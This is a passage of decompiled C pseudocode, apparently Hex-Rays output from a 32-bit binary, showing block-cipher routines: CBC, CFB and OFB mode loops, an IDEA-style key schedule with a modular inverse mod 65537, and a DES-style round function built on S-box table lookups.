        v21 = (v20 << 16) | (v19 << 24);
        v22 = *++v13;
        v23 = (v22 << 8) | v21;
        v24 = v13[1];
        v70 = v8 ^ v18;
        v7 = v13 + 2;
        v71 = v76 ^ (v24 | v23);
        sub_4B6D30((unsigned int *)&v70, a4);
        v8 = v70;
        v25 = v6 + 1;
        *(v25++ - 1) = HIBYTE(v70);
        *(v25 - 1) = BYTE2(v8);
        result = v71;
        *v25++ = BYTE1(v8);
        *v25++ = v8;
        *v25++ = HIBYTE(result);
        *v25++ = BYTE2(result);
        *v25++ = BYTE1(result);
        *v25 = result;
        v6 = v25 + 1;
        v26 = v72-- == 1;
        v76 = result;
      }
      while ( !v26 );
      v10 = v66;
    }
    if ( v10 != -8 )
    {
      v27 = (int)&v7[v10 + 8];
      v28 = 0;
      v73 = 0;
      switch ( v10 )
      {
        case 0xFFFFFFF9:
          goto LABEL_15;
        case 0xFFFFFFFA:
          goto LABEL_14;
        case 0xFFFFFFFB:
          goto LABEL_13;
        case 0xFFFFFFFC:
          goto LABEL_12;
        case 0xFFFFFFFD:
          goto LABEL_11;
        case 0xFFFFFFFE:
          goto LABEL_10;
        case 0xFFFFFFFF:
          goto LABEL_9;
        case 0u:
          v29 = *(unsigned __int8 *)--v27;
          v73 = v29;
LABEL_9:
          v30 = *(unsigned __int8 *)--v27;
          v73 |= v30 << 8;
LABEL_10:
          v31 = *(unsigned __int8 *)--v27;
          v73 |= v31 << 16;
LABEL_11:
          v32 = *(unsigned __int8 *)--v27;
          v73 |= v32 << 24;
LABEL_12:
          v28 = *(unsigned __int8 *)--v27;
LABEL_13:
          v33 = *(unsigned __int8 *)--v27;
          v28 |= v33 << 8;
LABEL_14:
          v34 = *(unsigned __int8 *)--v27;
          v28 |= v34 << 16;
LABEL_15:
          v28 |= *(unsigned __int8 *)(v27 - 1) << 24;
          break;
        default:
          break;
      }
      v70 = v8 ^ v28;
      v71 = result ^ v73;
      sub_4B6D30((unsigned int *)&v70, a4);
      v8 = v70;
      v35 = v6 + 1;
      *(v35 - 1) = HIBYTE(v70);
      *v35 = BYTE2(v8);
      result = v71;
      *++v35 = BYTE1(v8);
      *++v35 = v8;
      *++v35 = HIBYTE(result);
      *++v35 = BYTE2(result);
      *++v35 = BYTE1(result);
      v35[1] = result;
    }
    *(_BYTE *)a5 = HIBYTE(v8);
    *(_BYTE *)(a5 + 1) = BYTE2(v8);
    *(_BYTE *)(a5 + 2) = BYTE1(v8);
    v36 = (_BYTE *)(a5 + 3);
    *(_BYTE *)(a5 + 3) = v8;
  }
  else
  {
    v37 = a2;
    v38 = a1;
    v39 = _byteswap_ulong(*(_DWORD *)a5);
    result = _byteswap_ulong(*(_DWORD *)(a5 + 4));
    v40 = (_BYTE *)a5;
    v41 = a3 - 8;
    v68 = v39;
    v77 = result;
    v67 = a3 - 8;
    if ( (int)(a3 - 8) >= 0 )
    {
      v74 = a3 >> 3;
      v67 = v41 - 8 * v74;
      do
      {
        v42 = *v38;
        v43 = v38[1];
        v44 = v38 + 1;
        v45 = *++v44;
        v46 = *++v44;
        v47 = *++v44;
        v48 = (v43 << 16) | (v42 << 24);
        v49 = *++v44;
        v50 = (v45 << 8) | v48;
        v51 = *++v44;
        v52 = v46 | v50;
        v53 = v44[1] | (v51 << 8) | (v49 << 16) | (v47 << 24);
        v70 = v52;
        v38 = v44 + 2;
        v71 = v53;
        sub_4B6D30((unsigned int *)&v70, a4);
        v54 = v70 ^ v68;
        v55 = v71 ^ v77;
        *v37 = (v70 ^ v68) >> 24;
        v56 = v37 + 1;
        *v56++ = BYTE2(v54);
        *v56 = BYTE1(v54);
        v56[1] = v54;
        v56 += 2;
        *v56++ = HIBYTE(v55);
        *v56++ = BYTE2(v55);
        *v56++ = BYTE1(v55);
        *v56 = v55;
        v37 = v56 + 1;
        v26 = v74-- == 1;
        v68 = v52;
        v77 = v53;
      }
      while ( !v26 );
      v40 = (_BYTE *)a5;
      v39 = v68;
      result = v77;
      v41 = v67;
    }
    if ( v41 != -8 )
    {
      v57 = *v38;
      v58 = v38[1];
      v59 = v38 + 1;
      v60 = *++v59;
      v69 = v59[1] | (v60 << 8) | (v58 << 16) | (v57 << 24);
      v70 = v69;
      v75 = _byteswap_ulong(*(_DWORD *)(v59 + 2));
      v71 = v75;
      sub_4B6D30((unsigned int *)&v70, a4);
      v61 = v70 ^ v39;
      v62 = v71 ^ v77;
      v63 = (int)&v37[v67 + 8];
      switch ( v67 )
      {
        case 0xFFFFFFF9:
          goto LABEL_31;
        case 0xFFFFFFFA:
          goto LABEL_30;
        case 0xFFFFFFFB:
          goto LABEL_29;
        case 0xFFFFFFFC:
          goto LABEL_28;
        case 0xFFFFFFFD:
          goto LABEL_27;
        case 0xFFFFFFFE:
          goto LABEL_26;
        case 0xFFFFFFFF:
          goto LABEL_25;
        case 0u:
          *(_BYTE *)--v63 = v62;
LABEL_25:
          *(_BYTE *)--v63 = BYTE1(v62);
LABEL_26:
          *(_BYTE *)--v63 = BYTE2(v62);
LABEL_27:
          *(_BYTE *)--v63 = HIBYTE(v62);
LABEL_28:
          *(_BYTE *)--v63 = v61;
LABEL_29:
          *(_BYTE *)--v63 = BYTE1(v61);
LABEL_30:
          *(_BYTE *)--v63 = BYTE2(v61);
LABEL_31:
          *(_BYTE *)(v63 - 1) = HIBYTE(v61);
          break;
        default:
          break;
      }
      v39 = v69;
      result = v75;
    }
    *v40 = HIBYTE(v39);
    v64 = v40 + 1;
    *v64++ = BYTE2(v39);
    *v64 = BYTE1(v39);
    v36 = v64 + 1;
    *v36 = v39;
  }
  v65 = v36 + 1;
  *v65++ = HIBYTE(result);
  *v65++ = BYTE2(result);
  *v65 = BYTE1(result);
  v65[1] = result;
  return result;
}

//----- (004B7A80) --------------------------------------------------------
_BYTE *__cdecl sub_4B7A80(_BYTE *a1, _BYTE *a2, int a3, _DWORD *a4, unsigned __int8 *a5, int *a6)
{
  int v6; // esi
  int v7; // edx
  int v8; // ecx
  int v9; // ecx
  int v10; // edx
  int v11; // ebx
  unsigned int v13; // edx
  _BYTE *result; // eax
  _BYTE *v16; // eax
  int v17; // [esp+10h] [ebp-28h]
  int v18; // [esp+18h] [ebp-20h]
  int v19; // [esp+1Ch] [ebp-1Ch] BYREF
  unsigned int v20; // [esp+20h] [ebp-18h]
  _DWORD *v21; // [esp+24h] [ebp-14h]
  _BYTE *v22; // [esp+28h] [ebp-10h]
  char v23; // [esp+2Ch] [ebp-Ch]
  char v24; // [esp+2Dh] [ebp-Bh]
  char v25; // [esp+2Eh] [ebp-Ah]
  char v26; // [esp+2Fh] [ebp-9h]
  char v27; // [esp+30h] [ebp-8h]
  char v28; // [esp+31h] [ebp-7h]
  char v29; // [esp+32h] [ebp-6h]
  char v30; // [esp+33h] [ebp-5h]

  v21 = a4;
  v6 = *a6;
  v7 = a5[1];
  v18 = a3;
  v8 = *a5;
  v22 = a5 + 1;
  v9 = a5[3] | (a5[2] << 8) | (v7 << 16) | (v8 << 24);
  v10 = (a5[5] << 16) | (a5[4] << 24);
  v11 = a5[7] | (a5[6] << 8);
  v23 = HIBYTE(v9);
  v24 = BYTE2(v9);
  v13 = v11 | v10;
  v25 = BYTE1(v9);
  v27 = HIBYTE(v13);
  v28 = BYTE2(v13);
  result = (_BYTE *)(v13 >> 8);
  v17 = 0;
  v19 = v9;
  v20 = v13;
  v26 = v9;
  v29 = BYTE1(v13);
  v30 = v13;
  if ( a3 )
  {
    do
    {
      --v18;
      if ( !v6 )
      {
        sub_4B6D30((unsigned int *)&v19, v21);
        v9 = v19;
        v23 = HIBYTE(v19);
        v24 = BYTE2(v19);
        v25 = BYTE1(v19);
        v13 = v20;
        v27 = HIBYTE(v20);
        v28 = BYTE2(v20);
        ++v17;
        v26 = v19;
        v29 = BYTE1(v20);
        v30 = v20;
      }
      *a2++ = *a1++ ^ *(&v23 + v6);
      v6 = ((_BYTE)v6 + 1) & 7;
    }
    while ( v18 );
    if ( v17 )
    {
      *a5 = HIBYTE(v9);
      v16 = v22;
      *v22 = BYTE2(v9);
      *++v16 = BYTE1(v9);
      v16[1] = v9;
      v16 += 2;
      *v16++ = HIBYTE(v13);
      *v16 = BYTE2(v13);
      result = v16 + 1;
      *result = BYTE1(v13);
      result[1] = v13;
    }
    else
    {
      result = a6;
    }
    *a6 = v6;
  }
  else
  {
    *a6 = v6;
  }
  return result;
}

//----- (004B7C70) --------------------------------------------------------
int *__cdecl sub_4B7C70(char *a1, _BYTE *a2, int a3, _DWORD *a4, int a5, int *a6, int a7)
{
  int *result; // eax
  int v8; // ebp
  int v9; // esi
  int v10; // edx
  unsigned int v11; // ecx
  int v12; // ecx
  char v13; // al
  int v14; // edx
  unsigned int v15; // ecx
  int v16; // ecx
  char v17; // al
  char v18; // cl
  unsigned int v19; // [esp+10h] [ebp-8h] BYREF
  int v20; // [esp+14h] [ebp-4h]

  result = a6;
  v8 = a3;
  v9 = *a6;
  if ( !a7 )
  {
    if ( a3 )
    {
      do
      {
        --v8;
        if ( !v9 )
        {
          v14 = *(unsigned __int8 *)(a5 + 5);
          v19 = _byteswap_ulong(*(_DWORD *)a5);
          v20 = (v14 << 16) | (*(unsigned __int8 *)(a5 + 4) << 24) | *(unsigned __int8 *)(a5 + 7) | (*(unsigned __int8 *)(a5 + 6) << 8);
          sub_4B6D30(&v19, a4);
          v15 = v19;
          *(_BYTE *)a5 = HIBYTE(v19);
          *(_BYTE *)(a5 + 1) = BYTE2(v15);
          *(_BYTE *)(a5 + 2) = BYTE1(v15);
          *(_BYTE *)(a5 + 3) = v15;
          v16 = v20;
          *(_BYTE *)(a5 + 4) = HIBYTE(v20);
          *(_BYTE *)(a5 + 5) = BYTE2(v16);
          *(_BYTE *)(a5 + 6) = BYTE1(v16);
          *(_BYTE *)(a5 + 7) = v16;
        }
        v17 = *a1++;
        v18 = *(_BYTE *)(v9 + a5);
        *(_BYTE *)(v9 + a5) = v17;
        *a2 = v18 ^ v17;
        v9 = ((_BYTE)v9 + 1) & 7;
        ++a2;
      }
      while ( v8 );
      result = a6;
    }
    goto LABEL_12;
  }
  if ( !a3 )
  {
LABEL_12:
    *result = v9;
    return result;
  }
  do
  {
    --v8;
    if ( !v9 )
    {
      v10 = *(unsigned __int8 *)(a5 + 5);
      v19 = _byteswap_ulong(*(_DWORD *)a5);
      v20 = (v10 << 16) | (*(unsigned __int8 *)(a5 + 4) << 24) | *(unsigned __int8 *)(a5 + 7) | (*(unsigned __int8 *)(a5 + 6) << 8);
      sub_4B6D30(&v19, a4);
      v11 = v19;
      *(_BYTE *)a5 = HIBYTE(v19);
      *(_BYTE *)(a5 + 1) = BYTE2(v11);
      *(_BYTE *)(a5 + 2) = BYTE1(v11);
      *(_BYTE *)(a5 + 3) = v11;
      v12 = v20;
      *(_BYTE *)(a5 + 4) = HIBYTE(v20);
      *(_BYTE *)(a5 + 5) = BYTE2(v12);
      *(_BYTE *)(a5 + 6) = BYTE1(v12);
      *(_BYTE *)(a5 + 7) = v12;
    }
    v13 = *(_BYTE *)(v9 + a5) ^ *a1++;
    *a2 = v13;
    *(_BYTE *)(v9 + a5) = v13;
    v9 = ((_BYTE)v9 + 1) & 7;
    ++a2;
  }
  while ( v8 );
  result = a6;
  *a6 = v9;
  return result;
}

//----- (004B7E70) --------------------------------------------------------
_DWORD *__cdecl sub_4B7E70(unsigned __int8 *a1, _DWORD *a2)
{
  int *v2; // ecx
  int v3; // esi
  _DWORD *result; // eax
  int i; // ebx
  int v6; // esi
  unsigned int v7; // edi
  unsigned int v8; // edx
  unsigned int v9; // esi
  _DWORD *v10; // eax
  unsigned int v11; // edx
  unsigned int v12; // esi
  unsigned int v13; // edx
  unsigned int v14; // esi
  _DWORD *v15; // eax

  *a2 = *a1 << 8;
  *a2 |= a1[1];
  a2[1] = a1[2] << 8;
  a2[1] |= a1[3];
  a2[2] = a1[4] << 8;
  a2[2] |= a1[5];
  v2 = a2 + 2;
  a2[3] = a1[6] << 8;
  a2[3] |= a1[7];
  a2[4] = a1[8] << 8;
  a2[4] |= a1[9];
  a2[5] = a1[10] << 8;
  a2[5] |= a1[11];
  a2[6] = a1[12] << 8;
  a2[6] |= a1[13];
  v3 = a1[14] << 8;
  a2[7] = v3;
  a2[7] = v3 | a1[15];
  result = a2 + 8;
  for ( i = 0; i < 6; ++i )
  {
    v6 = *v2;
    v7 = *(v2 - 1);
    *result = (unsigned __int16)(((_WORD)v7 << 9) | ((unsigned int)*v2 >> 7));
    v8 = v2[1];
    result[1] = (unsigned __int16)(((_WORD)v6 << 9) | (v8 >> 7));
    v9 = v2[2];
    v10 = result + 1;
    v10[1] = (unsigned __int16)((v9 >> 7) | ((_WORD)v8 << 9));
    v11 = v2[3];
    ++v10;
    v10[1] = (unsigned __int16)(((_WORD)v9 << 9) | (v11 >> 7));
    v12 = v2[4];
    v10 += 2;
    *v10 = (unsigned __int16)((v12 >> 7) | ((_WORD)v11 << 9));
    v13 = v2[5];
    *++v10 = (unsigned __int16)(((_WORD)v12 << 9) | (v13 >> 7));
    v14 = *(v2 - 2);
    result = v10 + 1;
    if ( i >= 5 )
      break;
    *result = (unsigned __int16)((v14 >> 7) | ((_WORD)v13 << 9));
    v15 = result + 1;
    *v15 = (unsigned __int16)((v7 >> 7) | ((_WORD)v14 << 9));
    result = v15 + 1;
    v2 += 8;
  }
  return result;
}

//----- (004B7FF0) --------------------------------------------------------
int __fastcall sub_4B7FF0(int a1)
{
  int v2; // ebx
  int v3; // esi
  int i; // ebp
  int v5; // edi
  int v6; // ebp
  int v7; // edx

  if ( !a1 )
    return 0;
  v2 = 65537;
  v3 = 1;
  for ( i = 0; ; i = v7 )
  {
    v5 = v2 % a1;
    if ( !(v2 % a1) )
      break;
    v6 = i - v3 * ((v2 - v2 % a1) / a1);
    v7 = v3;
    v2 = a1;
    v3 = v6;
    a1 = v5;
  }
  return v3 + (v3 < 0 ? 0x10001 : 0);
}

//----- (004B8040) --------------------------------------------------------
int __cdecl sub_4B8040(int a1, int *a2)
{
  int v2; // edi
  int *v3; // esi
  int i; // ebx
  int *v5; // esi
  _DWORD *v6; // esi
  int v7; // edx
  _DWORD *v8; // esi
  int v9; // ecx
  int v10; // edx
  int result; // eax

  v2 = a1 + 192;
  v3 = a2;
  for ( i = 0; i < 9; ++i )
  {
    *v3 = sub_4B7FF0(*(_DWORD *)v2);
    v5 = v3 + 1;
    *v5++ = (unsigned __int16)-*(_WORD *)(v2 + 8);
    *v5++ = (unsigned __int16)-*(_WORD *)(v2 + 4);
    *v5 = sub_4B7FF0(*(_DWORD *)(v2 + 12));
    v6 = v5 + 1;
    if ( i == 8 )
      break;
    v7 = *(_DWORD *)(v2 - 8);
    v2 -= 24;
    *v6 = v7;
    v8 = v6 + 1;
    *v8 = *(_DWORD *)(v2 + 20);
    v3 = v8 + 1;
  }
  v9 = a2[2];
  v10 = a2[50];
  a2[2] = a2[1];
  result = a2[49];
  a2[1] = v9;
  a2[49] = v10;
  a2[50] = result;
  return result;
}

//----- (004B80E0) --------------------------------------------------------
_WORD *__cdecl sub_4B80E0(unsigned __int16 *a1, _WORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int a6)
{
  int v6; // edx
  int v7; // esi
  __int16 v8; // ecx^2
  __int16 v9; // ecx^2
  _WORD *result; // eax
  int v11; // [esp+4h] [ebp-8h] BYREF
  int v12; // [esp+8h] [ebp-4h]

  v6 = *((unsigned __int8 *)a1 + 4);
  v7 = *((unsigned __int8 *)a1 + 5);
  v11 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
  v12 = (v7 << 8) | v6 | (a1[3] << 16);
  if ( a6 )
    sub_4B93A0(&v11, a3, a4, a5);
  else
    sub_4B94D0(&v11, a3, a4, a5);
  v8 = HIWORD(v11);
  *a2 = v11;
  a2[1] = v8;
  v9 = HIWORD(v12);
  a2[2] = v12;
  result = a2 + 3;
  a2[3] = v9;
  return result;
}

//----- (004B81C0) --------------------------------------------------------
char __cdecl sub_4B81C0(_BYTE *a1, _BYTE *a2, int a3, _DWORD *a4, _DWORD *a5, _DWORD *a6, unsigned __int8 *a7, int *a8)
{
  int v8; // edx
  int v9; // edi
  int v10; // ecx
  int v11; // edx
  int v12; // ebx
  unsigned int v13; // edx
  unsigned int v14; // eax
  _BYTE *v15; // ebp
  _BYTE *v16; // esi
  int v18; // [esp+14h] [ebp-30h]
  int v19; // [esp+18h] [ebp-2Ch]
  int v20; // [esp+1Ch] [ebp-28h] BYREF
  unsigned int v21; // [esp+20h] [ebp-24h]
  _BYTE *v22; // [esp+24h] [ebp-20h]
  _DWORD *v23; // [esp+28h] [ebp-1Ch]
  _BYTE *v24; // [esp+2Ch] [ebp-18h]
  _DWORD *v25; // [esp+30h] [ebp-14h]
  _DWORD *v26; // [esp+34h] [ebp-10h]
  int v27; // [esp+38h] [ebp-Ch]
  unsigned int v28; // [esp+3Ch] [ebp-8h]

  v22 = a2;
  v23 = a6;
  v25 = a5;
  v8 = a7[1];
  v9 = *a8;
  v24 = a7 + 1;
  v26 = a4;
  v10 = (a7[3] << 24) | (a7[2] << 16) | (v8 << 8) | *a7;
  v11 = *((unsigned __int16 *)a7 + 2);
  v12 = *((unsigned __int16 *)a7 + 3);
  v27 = v10;
  v13 = (v12 << 16) | v11;
  v28 = v13;
  v18 = a3;
  v19 = 0;
  v20 = v10;
  v21 = v13;
  if ( a3 )
  {
    do
    {
      --v18;
      if ( !v9 )
      {
        sub_4B93A0(&v20, v26, v25, v23);
        v13 = v21;
        v10 = v20;
        v27 = v20;
        v28 = v21;
        ++v19;
      }
      LOBYTE(v14) = *a1 ^ *((_BYTE *)&v27 + v9);
      v15 = v22;
      ++a1;
      *v22 = v14;
      v9 = ((_BYTE)v9 + 1) & 7;
      v22 = v15 + 1;
    }
    while ( v18 );
    if ( v19 )
    {
      *a7 = v10;
      v16 = v24;
      *v24 = BYTE1(v10);
      *++v16 = BYTE2(v10);
      *++v16 = HIBYTE(v10);
      v16[1] = v13;
      v16 += 2;
      *v16++ = BYTE1(v13);
      v14 = HIWORD(v13);
      *v16 = BYTE2(v13);
      v16[1] = HIBYTE(v13);
    }
    *a8 = v9;
  }
  else
  {
    LOBYTE(v14) = (_BYTE)a8;
    *a8 = v9;
  }
  return v14;
}

//----- (004B8400) --------------------------------------------------------
int __usercall sub_4B8400@<eax>(_DWORD *a1@<ecx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>)
{
  unsigned int v4; // eax
  unsigned int v5; // edx
  int v6; // ebx
  int v7; // ecx
  unsigned int v8; // edx
  int v9; // edi
  int v10; // edi
  int v11; // edi
  int v12; // edi
  unsigned int v13; // eax
  int v14; // ebx
  int v15; // ecx
  unsigned int v16; // edx
  int v17; // esi
  int v18; // esi
  int v19; // esi
  int v20; // esi
  unsigned int v21; // eax
  int v22; // ebx
  int v23; // ecx
  unsigned int v24; // edx
  int v25; // edi
  int v26; // edi
  int v27; // edi
  int v28; // edi
  unsigned int v29; // eax
  int v30; // ebx
  int v31; // ecx
  unsigned int v32; // edx
  int v33; // esi
  int v34; // esi
  int v35; // esi
  int v36; // esi
  unsigned int v37; // eax
  int v38; // ebx
  int v39; // ecx
  unsigned int v40; // edx
  int v41; // edi
  int v42; // edi
  int v43; // edi
  int v44; // edi
  unsigned int v45; // eax
  int v46; // ebx
  int v47; // ecx
  unsigned int v48; // edx
  int v49; // esi
  int v50; // esi
  int v51; // esi
  int v52; // esi
  unsigned int v53; // eax
  int v54; // ebx
  int v55; // ecx
  unsigned int v56; // edx
  int v57; // edi
  int v58; // edi
  int v59; // edi
  int v60; // edi
  unsigned int v61; // eax
  int v62; // ebx
  int v63; // ecx
  unsigned int v64; // edx
  int v65; // esi
  int v66; // esi
  int v67; // esi
  int v68; // esi
  unsigned int v69; // eax
  int v70; // ebx
  int v71; // ecx
  unsigned int v72; // edx
  int v73; // edi
  int v74; // edi
  int v75; // edi
  int v76; // edi
  unsigned int v77; // eax
  int v78; // ebx
  int v79; // ecx
  unsigned int v80; // edx
  int v81; // esi
  int v82; // esi
  int v83; // esi
  int v84; // esi
  unsigned int v85; // eax
  int v86; // ebx
  int v87; // ecx
  unsigned int v88; // edx
  int v89; // edi
  int v90; // edi
  int v91; // edi
  int v92; // edi
  unsigned int v93; // eax
  int v94; // ebx
  int v95; // ecx
  unsigned int v96; // edx
  int v97; // esi
  int v98; // esi
  int v99; // esi
  int v100; // esi
  unsigned int v101; // eax
  int v102; // ebx
  int v103; // ecx
  unsigned int v104; // edx
  int v105; // edi
  int v106; // edi
  int v107; // edi
  int v108; // edi
  unsigned int v109; // eax
  int v110; // ebx
  int v111; // ecx
  unsigned int v112; // edx
  int v113; // esi
  int v114; // esi
  int v115; // esi
  int v116; // esi
  unsigned int v117; // eax
  int v118; // ebx
  int v119; // ecx
  unsigned int v120; // edx
  int v121; // edi
  int v122; // edi
  int v123; // edi

  v4 = (a4 ^ *a1) & 0xFCFCFCFC;
  v5 = (a4 ^ a1[1]) & 0xCFCFCFCF;
  v6 = (unsigned __int8)v4;
  v7 = BYTE1(v4);
  v8 = __ROR4__(v5, 4);
  LOBYTE(v6) = v8;
  v9 = *(_DWORD *)(a2 + BYTE1(v4) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v4) ^ a3;
  LOBYTE(v7) = BYTE1(v8);
  v4 >>= 16;
  v10 = *(_DWORD *)(a2 + v6 + 256) ^ v9;
  LOBYTE(v6) = BYTE1(v4);
  v8 >>= 16;
  v11 = *(_DWORD *)(a2 + v7 + 768) ^ v10;
  LOBYTE(v7) = BYTE1(v8);
  v12 = *(_DWORD *)(a2 + (unsigned __int8)v8 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v4 + 1024) ^ *(_DWORD *)(a2 + v7 + 1792) ^ *(_DWORD *)(a2 + v6 + 1536) ^ v11;
  v13 = (v12 ^ a1[2]) & 0xFCFCFCFC;
  v14 = (unsigned __int8)v13;
  v15 = BYTE1(v13);
  v16 = __ROR4__((v12 ^ a1[3]) & 0xCFCFCFCF, 4);
  LOBYTE(v14) = v16;
  v17 = *(_DWORD *)(a2 + BYTE1(v13) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v13) ^ a4;
  LOBYTE(v15) = BYTE1(v16);
  v13 >>= 16;
  v18 = *(_DWORD *)(a2 + v14 + 256) ^ v17;
  LOBYTE(v14) = BYTE1(v13);
  v16 >>= 16;
  v19 = *(_DWORD *)(a2 + v15 + 768) ^ v18;
  LOBYTE(v15) = BYTE1(v16);
  v20 = *(_DWORD *)(a2 + (unsigned __int8)v16 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v13 + 1024) ^ *(_DWORD *)(a2 + v15 + 1792) ^ *(_DWORD *)(a2 + v14 + 1536) ^ v19;
  v21 = (v20 ^ a1[4]) & 0xFCFCFCFC;
  v22 = (unsigned __int8)v21;
  v23 = BYTE1(v21);
  v24 = __ROR4__((v20 ^ a1[5]) & 0xCFCFCFCF, 4);
  LOBYTE(v22) = v24;
  v25 = *(_DWORD *)(a2 + BYTE1(v21) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v21) ^ v12;
  LOBYTE(v23) = BYTE1(v24);
  v21 >>= 16;
  v26 = *(_DWORD *)(a2 + v22 + 256) ^ v25;
  LOBYTE(v22) = BYTE1(v21);
  v24 >>= 16;
  v27 = *(_DWORD *)(a2 + v23 + 768) ^ v26;
  LOBYTE(v23) = BYTE1(v24);
  v28 = *(_DWORD *)(a2 + (unsigned __int8)v24 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v21 + 1024) ^ *(_DWORD *)(a2 + v23 + 1792) ^ *(_DWORD *)(a2 + v22 + 1536) ^ v27;
  v29 = (v28 ^ a1[6]) & 0xFCFCFCFC;
  v30 = (unsigned __int8)v29;
  v31 = BYTE1(v29);
  v32 = __ROR4__((v28 ^ a1[7]) & 0xCFCFCFCF, 4);
  LOBYTE(v30) = v32;
  v33 = *(_DWORD *)(a2 + BYTE1(v29) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v29) ^ v20;
  LOBYTE(v31) = BYTE1(v32);
  v29 >>= 16;
  v34 = *(_DWORD *)(a2 + v30 + 256) ^ v33;
  LOBYTE(v30) = BYTE1(v29);
  v32 >>= 16;
  v35 = *(_DWORD *)(a2 + v31 + 768) ^ v34;
  LOBYTE(v31) = BYTE1(v32);
  v36 = *(_DWORD *)(a2 + (unsigned __int8)v32 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v29 + 1024) ^ *(_DWORD *)(a2 + v31 + 1792) ^ *(_DWORD *)(a2 + v30 + 1536) ^ v35;
  v37 = (v36 ^ a1[8]) & 0xFCFCFCFC;
  v38 = (unsigned __int8)v37;
  v39 = BYTE1(v37);
  v40 = __ROR4__((v36 ^ a1[9]) & 0xCFCFCFCF, 4);
  LOBYTE(v38) = v40;
  v41 = *(_DWORD *)(a2 + BYTE1(v37) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v37) ^ v28;
  LOBYTE(v39) = BYTE1(v40);
  v37 >>= 16;
  v42 = *(_DWORD *)(a2 + v38 + 256) ^ v41;
  LOBYTE(v38) = BYTE1(v37);
  v40 >>= 16;
  v43 = *(_DWORD *)(a2 + v39 + 768) ^ v42;
  LOBYTE(v39) = BYTE1(v40);
  v44 = *(_DWORD *)(a2 + (unsigned __int8)v40 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v37 + 1024) ^ *(_DWORD *)(a2 + v39 + 1792) ^ *(_DWORD *)(a2 + v38 + 1536) ^ v43;
  v45 = (v44 ^ a1[10]) & 0xFCFCFCFC;
  v46 = (unsigned __int8)v45;
  v47 = BYTE1(v45);
  v48 = __ROR4__((v44 ^ a1[11]) & 0xCFCFCFCF, 4);
  LOBYTE(v46) = v48;
  v49 = *(_DWORD *)(a2 + BYTE1(v45) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v45) ^ v36;
  LOBYTE(v47) = BYTE1(v48);
  v45 >>= 16;
  v50 = *(_DWORD *)(a2 + v46 + 256) ^ v49;
  LOBYTE(v46) = BYTE1(v45);
  v48 >>= 16;
  v51 = *(_DWORD *)(a2 + v47 + 768) ^ v50;
  LOBYTE(v47) = BYTE1(v48);
  v52 = *(_DWORD *)(a2 + (unsigned __int8)v48 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v45 + 1024) ^ *(_DWORD *)(a2 + v47 + 1792) ^ *(_DWORD *)(a2 + v46 + 1536) ^ v51;
  v53 = (v52 ^ a1[12]) & 0xFCFCFCFC;
  v54 = (unsigned __int8)v53;
  v55 = BYTE1(v53);
  v56 = __ROR4__((v52 ^ a1[13]) & 0xCFCFCFCF, 4);
  LOBYTE(v54) = v56;
  v57 = *(_DWORD *)(a2 + BYTE1(v53) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v53) ^ v44;
  LOBYTE(v55) = BYTE1(v56);
  v53 >>= 16;
  v58 = *(_DWORD *)(a2 + v54 + 256) ^ v57;
  LOBYTE(v54) = BYTE1(v53);
  v56 >>= 16;
  v59 = *(_DWORD *)(a2 + v55 + 768) ^ v58;
  LOBYTE(v55) = BYTE1(v56);
  v60 = *(_DWORD *)(a2 + (unsigned __int8)v56 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v53 + 1024) ^ *(_DWORD *)(a2 + v55 + 1792) ^ *(_DWORD *)(a2 + v54 + 1536) ^ v59;
  v61 = (v60 ^ a1[14]) & 0xFCFCFCFC;
  v62 = (unsigned __int8)v61;
  v63 = BYTE1(v61);
  v64 = __ROR4__((v60 ^ a1[15]) & 0xCFCFCFCF, 4);
  LOBYTE(v62) = v64;
  v65 = *(_DWORD *)(a2 + BYTE1(v61) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v61) ^ v52;
  LOBYTE(v63) = BYTE1(v64);
  v61 >>= 16;
  v66 = *(_DWORD *)(a2 + v62 + 256) ^ v65;
  LOBYTE(v62) = BYTE1(v61);
  v64 >>= 16;
  v67 = *(_DWORD *)(a2 + v63 + 768) ^ v66;
  LOBYTE(v63) = BYTE1(v64);
  v68 = *(_DWORD *)(a2 + (unsigned __int8)v64 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v61 + 1024) ^ *(_DWORD *)(a2 + v63 + 1792) ^ *(_DWORD *)(a2 + v62 + 1536) ^ v67;
  v69 = (v68 ^ a1[16]) & 0xFCFCFCFC;
  v70 = (unsigned __int8)v69;
  v71 = BYTE1(v69);
  v72 = __ROR4__((v68 ^ a1[17]) & 0xCFCFCFCF, 4);
  LOBYTE(v70) = v72;
  v73 = *(_DWORD *)(a2 + BYTE1(v69) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v69) ^ v60;
  LOBYTE(v71) = BYTE1(v72);
  v69 >>= 16;
  v74 = *(_DWORD *)(a2 + v70 + 256) ^ v73;
  LOBYTE(v70) = BYTE1(v69);
  v72 >>= 16;
  v75 = *(_DWORD *)(a2 + v71 + 768) ^ v74;
  LOBYTE(v71) = BYTE1(v72);
  v76 = *(_DWORD *)(a2 + (unsigned __int8)v72 + 1280) ^ *(_DWORD *)(a2 + (unsigned __int8)v69 + 1024) ^ *(_DWORD *)(a2 + v71 + 1792) ^ *(_DWORD *)(a2 + v70 + 1536) ^ v75;
  v77 = (v76 ^ a1[18]) & 0xFCFCFCFC;
  v78 = (unsigned __int8)v77;
  v79 = BYTE1(v77);
  v80 = __ROR4__((v76 ^ a1[19]) & 0xCFCFCFCF, 4);
  LOBYTE(v78) = v80;
  v81 = *(_DWORD *)(a2 + BYTE1(v77) + 512) ^ *(_DWORD *)(a2 + (unsigned __int8)v77) ^ v68;
